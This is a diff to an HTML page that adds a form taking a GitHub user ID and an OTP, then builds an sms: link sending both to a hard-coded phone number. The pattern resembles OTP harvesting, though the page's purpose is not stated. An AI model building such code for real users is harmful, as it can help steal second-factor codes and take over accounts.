@@ -3,9 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send SMS</title>
+    <title>Generate SMS Link</title>
+    <script>
+        function generateSmsLink() {
+            const otp = document.getElementById('otp').value;
+            const userId = document.getElementById('githubId').value;
+            const phoneNumber = "+919966699473";  // Replace with the actual phone number
+
+            const smsLink = `sms:${phoneNumber}?body=GitHub ID: ${userId}%0AOTP: ${otp}`;
+            document.getElementById('smsLink').href = smsLink;
+            document.getElementById('smsLink').style.display = 'inline';
+        }
+    </script>
 </head>
 <body>
-    <a href="sms:+917799878975?body=Test%201234">Send SMS</a>
+    <h1>Generate SMS Link</h1>
+    <form onsubmit="generateSmsLink(); return false;">
+        <label for="githubId">GitHub User ID:</label><br>
+        <input type="text" id="githubId" name="githubId" required><br><br>
+        
+        <label for="otp">OTP:</label><br>
+        <input type="text" id="otp" name="otp" required><br><br>
+        
+        <button type="submit">Generate SMS Link</button>
+    </form>
+
+    <p><a id="smsLink" href="#" style="display:none;">Send SMS</a></p>
 </body>
 </html>
+
+
+
